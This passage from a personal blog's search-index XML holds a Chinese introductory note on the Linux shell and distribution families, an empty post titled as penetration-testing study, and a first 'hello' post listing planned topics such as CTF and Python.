        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章：初识Linux"><a href="#第一章：初识Linux" class="headerlink" title="第一章：初识Linux"></a>第一章：初识Linux</h2><h3 id="1-1-shell"><a href="#1-1-shell" class="headerlink" title="1.1 shell"></a>1.1 shell</h3><p>​         Linux shell是一种特殊的<font color="#FF5E3A" size="4">交互式工具</font>。它为用户提供了启动程序、管理文件系统中的文件以及运行在Linux系统上的进程的途径。 shell的<font color="#FF5E3A" size="4">核心是命令行提示符</font>。命令行提示符是shell负责交互的部分。它允许你<strong>输入文本命令，然后解释命令，并在内核中执行</strong>。  </p><p>​        shell包含了一组内部命令，用这些命令可以完成诸如复制文件、移动文件、重命名文件、显示和终止系统中正运行的程序等操作。 shell也允许你在命令行提示符中输入程序的名称，它会将程序名传递给内核以启动它。</p><p>​        也可以将<strong>多个shell命令放入文件中</strong>作为程序执行，这些文件被称作<strong>shell脚本</strong>。你在命令行上执行的任何命令都可放进一个shell脚本中作为一组命令执行。这为创建那种需要把几个命令放在一起来工作的工具提供了便利。</p><p>​        linux有好几种版本的shell，默认的是bash shell。</p><h3 id="1-2-Linux系统分类"><a href="#1-2-Linux系统分类" class="headerlink" title="1.2 Linux系统分类"></a>1.2 Linux系统分类</h3><p>​        Linux主要的系统可以分为两类：<strong>Debian</strong>和<strong>Redhat</strong>，话有一些其他的自由发布的版本。</p><p>​        Debian系列主要有Debian、Ubuntu等。</p><p>​        Redhat系列主要有Redhat、CentOs等。</p><p>​        <strong>不同的系统版本某些命令可能是不一样的</strong>，比如 Debian 使用 <font color="#FF5E3A" size="4">apt-get</font>来安装包，但CentOs使用 <font color="#FF5E3A" size="4">yum</font>。</p><hr><p>第一张就是简要介绍一下什么是linux shell以及常见的发行版本。下一章，将详细讲解shell的使用。</p><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux1/202201150952192.jpg" alt="hello">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透学习</title>
      <link href="/posts/myh10001.html"/>
      <url>/posts/myh10001.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/posts/myh10000.html"/>
      <url>/posts/myh10000.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!</p><p>大概更新的学习内容会有CTF，渗透，机器学习，python，Java的相关知识，期待您的来访~</p><hr><img src="/images/1.png" alt="hello" style="zoom:55%;">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
